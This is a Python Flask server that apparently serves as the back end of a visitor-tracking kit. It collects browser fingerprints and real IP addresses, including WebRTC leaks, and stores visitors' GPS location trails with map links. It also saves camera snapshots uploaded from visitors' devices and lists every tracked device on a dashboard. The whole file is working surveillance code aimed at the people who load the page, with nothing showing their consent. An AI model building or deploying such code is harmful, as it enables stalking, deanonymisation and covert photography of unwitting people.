from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
from threading import Lock
import json, os, queue, threading
from engine import DeviceIntelligenceEngine

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__, static_folder=BASE_DIR, static_url_path='')
engine = DeviceIntelligenceEngine()
write_queue = queue.Queue()

def writer_thread():
    while True:
        task = write_queue.get()
        try:   task()
        except Exception as e: print(f'[writer] error: {e}')
        finally: write_queue.task_done()

threading.Thread(target=writer_thread, daemon=True).start()

# ── helpers ──────────────────────────────────────────────────────────────────

def load_json(path, default=None):
    if default is None: default = {}
    if os.path.exists(path):
        with open(path, 'r') as f:
            return json.load(f)
    return default

def save_json(path, data):
    os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def get_real_ips(data):
    ips = {'ipv4': None, 'ipv6': None, 'raw': None}
    geoip_ip = (data.get('network') or {}).get('geoip') or {}
    if isinstance(geoip_ip, dict):
        ip = geoip_ip.get('ip','')
        if ':' in ip: ips['ipv6'] = ip
        elif '.' in ip: ips['ipv4'] = ip

    webrtc = (data.get('network') or {}).get('webrtc') or {}
    if isinstance(webrtc, dict):
        for lip in webrtc.get('local', []):
            if ':' in lip and not ips['ipv6']: ips['ipv6'] = lip
            elif '.' in lip and not ips['ipv4']: ips['ipv4'] = lip
        for pip in webrtc.get('public', []):
            if ':' in pip and not ips['ipv6']: ips['ipv6'] = pip
            elif '.' in pip and not ips['ipv4']: ips['ipv4'] = pip

    forwarded = request.headers.get('X-Forwarded-For','').split(',')[0].strip()
    if forwarded and forwarded != '127.0.0.1':
        if ':' in forwarded and not ips['ipv6']:  ips['ipv6'] = forwarded
        elif '.' in forwarded and not ips['ipv4']: ips['ipv4'] = forwarded

    remote = request.remote_addr
    if remote and remote not in ('127.0.0.1','::1'):
        ips['raw'] = remote
        if ':' in remote and not ips['ipv6']:  ips['ipv6'] = remote
        elif '.' in remote and not ips['ipv4']: ips['ipv4'] = remote

    return ips

def get_device_id(data):
    h = data.get('stableHash','')
    return h[:16] if h else 'unknown'

def ensure_device_dir(device_id):
    path = os.path.join(BASE_DIR, 'Database', device_id)
    os.makedirs(path, exist_ok=True)
    return path

# ── routes ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/fp/<path:filename>')
def serve_fp(filename):
    return send_from_directory(os.path.join(BASE_DIR, 'fp'), filename, max_age=0)

@app.route('/log', methods=['POST'])
def log():
    data              = request.json
    data['timestamp'] = datetime.now().isoformat()
    ips              = get_real_ips(data)
    data['ip']       = ips['ipv4'] or ips['ipv6'] or request.remote_addr
    data['ipv4']     = ips['ipv4']
    data['ipv6']     = ips['ipv6']

    if data['ip'] in ('127.0.0.1', '::1'):
        data['ip'] = data.get('network',{}).get('geoip',{}).get('ip','unknown') \
                     if isinstance(data.get('network',{}).get('geoip'), dict) else 'unknown'

    device_id = get_device_id(data)

    def write():
        dev_dir  = ensure_device_dir(device_id)
        sess_dir = os.path.join(dev_dir, 'sessions')
        os.makedirs(sess_dir, exist_ok=True)
        ts_safe = data['timestamp'].replace(':','-').replace('.','-')
        save_json(os.path.join(sess_dir, f'{ts_safe}.json'), data)

        data_path = os.path.join(BASE_DIR, 'data.json')
        entries = load_json(data_path, [])
        if isinstance(entries, dict): entries = [entries]
        entries.append(data)
        if len(entries) > 500: entries = entries[-500:]
        save_json(data_path, entries)

        meta_path = os.path.join(dev_dir, 'meta.json')
        meta      = load_json(meta_path, {})
        geoip   = data.get('network',{}).get('geoip',{}) or {}
        verdict = data.get('verdict',{}) or {}
        hw      = data.get('hardware',{}) or {}
        os_data = data.get('os',{}) or {}
        env     = data.get('environment',{}) or {}

        meta.update({
            'device_id':     device_id,
            'first_seen':    meta.get('first_seen', data['timestamp']),
            'last_seen':     data['timestamp'],
            'session_count': meta.get('session_count', 0) + 1,
            'ipv4':          ips['ipv4'],
            'ipv6':          ips['ipv6'],
            'country':       geoip.get('country'),
            'city':          geoip.get('city'),
            'isp':           geoip.get('isp'),
            'asn':           geoip.get('asn'),
            'timezone_geo':  geoip.get('timezone'),
            'latitude':      geoip.get('latitude'),
            'longitude':     geoip.get('longitude'),
            'cpu_cores':     (hw.get('cpu') or {}).get('cores'),
            'ram_gb':        hw.get('memory'),
            'gpu':           (hw.get('gpu') or {}).get('renderer','')[:60],
            'os_version':    (os_data.get('highEntropy') or {}).get('osVersion'),
            'browser':       _get_browser_brand(data),
            'platform':      (os_data.get('basic') or {}).get('platform'),
            'verdict':       verdict.get('label'),
            'confidence':    verdict.get('confidence'),
            'vm_score':      (verdict.get('scores') or {}).get('vm'),
            'bot_score':     (verdict.get('scores') or {}).get('bot'),
            'sandbox_score': (verdict.get('scores') or {}).get('sandbox'),
            'flags':         verdict.get('flags', []),
            'keyboard':      (env.get('hardware') or {}).get('keyboard',{}).get('type'),
            'pointer':       (env.get('hardware') or {}).get('pointer',{}).get('pointerType'),
            'is_touch':      (env.get('hardware') or {}).get('touch',{}).get('isTouchDevice'),
            'battery_present': (env.get('hardware') or {}).get('battery',{}).get('present'),
            'likely_desktop_vm': (env.get('hardware') or {}).get('battery',{}).get('likelyDesktopOrVM'),
            'location':      meta.get('location', None),
        })

        save_json(meta_path, meta)
        print(f'[log] device={device_id} ipv4={ips["ipv4"]} ipv6={ips["ipv6"]} sessions={meta["session_count"]}')

    write_queue.put(write)
    return jsonify({'status':'ok','device_id':device_id})


@app.route('/log_location', methods=['POST'])
def log_location():
    data              = request.json
    data['server_ts'] = datetime.now().isoformat()
    device_id         = request.args.get('device_id','unknown')[:16]

    def write():
        dev_dir  = ensure_device_dir(device_id)
        loc_dir  = os.path.join(dev_dir, 'locations')
        os.makedirs(loc_dir, exist_ok=True)
        loc_path = os.path.join(loc_dir, 'log.json')
        entries  = load_json(loc_path, [])
        entries.append(data)
        save_json(loc_path, entries)

        if data.get('lat') and data.get('lng'):
            trail_path = os.path.join(loc_dir, 'trail.json')
            trail      = load_json(trail_path, [])
            trail.append({
                'lat':      data['lat'],
                'lng':      data['lng'],
                'accuracy': data.get('accuracy'),
                'source':   data.get('source'),
                'ts':       data.get('timestamp')
            })
            save_json(trail_path, trail)

        meta_path = os.path.join(dev_dir, 'meta.json')
        meta      = load_json(meta_path, {})
        meta['location'] = {
            'lat':         data.get('lat'),
            'lng':         data.get('lng'),
            'accuracy_m':  data.get('accuracy'),
            'source':      data.get('source'),
            'altitude':    data.get('altitude'),
            'speed_ms':    data.get('speed'),
            'heading':     data.get('heading'),
            'timestamp':   data.get('timestamp'),
            'maps_link':   f"https://maps.google.com/?q={data.get('lat')},{data.get('lng')}"
        }
        save_json(meta_path, meta)
        print(f'[location] device={device_id} lat={data.get("lat")} lng={data.get("lng")} acc={data.get("accuracy")}m')

    write_queue.put(write)
    return jsonify({'status':'ok'})

@app.route('/upload', methods=['POST'])
def upload_camera():
    import base64
    data      = request.json
    device_id = request.args.get('device_id', 'unknown')[:16]
    shot_idx  = request.args.get('shot', '0')
    image_b64 = data.get('image', '')

    if ',' in image_b64:
        image_b64 = image_b64.split(',')[1]

    def write():
        dev_dir = ensure_device_dir(device_id)
        cam_dir = os.path.join(dev_dir, 'camshots')
        os.makedirs(cam_dir, exist_ok=True)
        ts    = datetime.now().strftime('%Y%m%d_%H%M%S')
        fname = f'{ts}_shot{shot_idx}.png'
        fpath = os.path.join(cam_dir, fname)
        with open(fpath, 'wb') as f:
            f.write(base64.b64decode(image_b64))
        print(f'[camera] device={device_id} shot={shot_idx} saved={fname}')

    write_queue.put(write)
    return jsonify({'status': 'ok'})

@app.route('/device_camshots/<device_id>')
def list_camshots(device_id):
    cam_dir = os.path.join(BASE_DIR, 'Database', device_id[:16], 'camshots')
    if not os.path.exists(cam_dir):
        return jsonify([])
    files = sorted(os.listdir(cam_dir), reverse=True)
    return jsonify(files)

@app.route('/camshots/<device_id>/<filename>')
def serve_camshot(device_id, filename):
    cam_dir = os.path.join(BASE_DIR, 'Database', device_id[:16], 'camshots')
    return send_from_directory(cam_dir, filename)


@app.route('/dashboard')
def dashboard():
    return send_from_directory(BASE_DIR, 'dashboard.html')

@app.route('/device_sessions/<device_id>')
def device_sessions(device_id):
    sess_dir = os.path.join(BASE_DIR, 'Database', device_id[:16], 'sessions')
    if not os.path.exists(sess_dir):
        return jsonify([])
    files = sorted(os.listdir(sess_dir), reverse=True)[:20]
    out   = []
    for f in files:
        try:
            data = load_json(os.path.join(sess_dir, f), {})
            result = engine.process(data)
            data.update(result)
            out.append(data)
        except: pass
    return jsonify(out)


@app.route('/devices', methods=['GET'])
def list_devices():
    db_path = os.path.join(BASE_DIR, 'Database')
    if not os.path.exists(db_path): return jsonify([])
    devices = []
    for d in os.listdir(db_path):
        meta_path = os.path.join(db_path, d, 'meta.json')
        if os.path.exists(meta_path):
            devices.append(load_json(meta_path))
    return jsonify(sorted(devices, key=lambda x: x.get('last_seen',''), reverse=True))


def _get_browser_brand(data):
    brands = (data.get('os',{}).get('highEntropy',{}) or {}).get('fullVersionList',[]) or []
    for b in brands:
        if isinstance(b,dict):
            name = b.get('brand','').lower()
            if name not in ['not.a/brand','chromium']: return name
    return 'unknown'


if __name__ == '__main__':
    from waitress import serve
    print('[server] starting on http://0.0.0.0:5000')
    serve(app, host='0.0.0.0', port=5000, threads=8)